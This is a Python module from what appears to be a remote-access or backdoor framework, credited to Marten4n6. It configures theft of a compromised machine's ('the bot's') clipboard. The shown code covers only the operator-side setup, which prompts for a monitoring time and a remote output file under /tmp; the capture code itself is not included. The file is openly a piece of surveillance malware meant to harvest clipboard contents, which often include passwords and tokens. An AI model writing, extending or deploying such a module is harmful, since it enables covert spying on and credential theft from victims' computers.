# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
import os


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve or monitor the bot's clipboard.",
            "References": [],
            "Stoppable": False
        }

    def setup(self, view) -> Tuple[bool, Optional[dict]]:
        monitor_time = view.prompt("Time in seconds to monitor the clipboard [ENTER for 0]: ")

        if not monitor_time:
            monitor_time = 0

        if not str(monitor_time).isdigit():
            view.output("Invalid monitor time (should be in seconds).", "attention")
            return False, None
        else:
            should_output = view.prompt("Would you like to output to a file? [y/N] ").lower()

            if should_output == "y":
                output_file = view.prompt("Remote output directory [ENTER for /tmp/<RANDOM>]:")

                if not output_file:
                    output_file = os.path.join("/tmp", random_string(8) + ".txt")
            else:
                output_file = ""

            return True, {
                "monitor_time": monitor_time,
                "output_file": output_file
            }
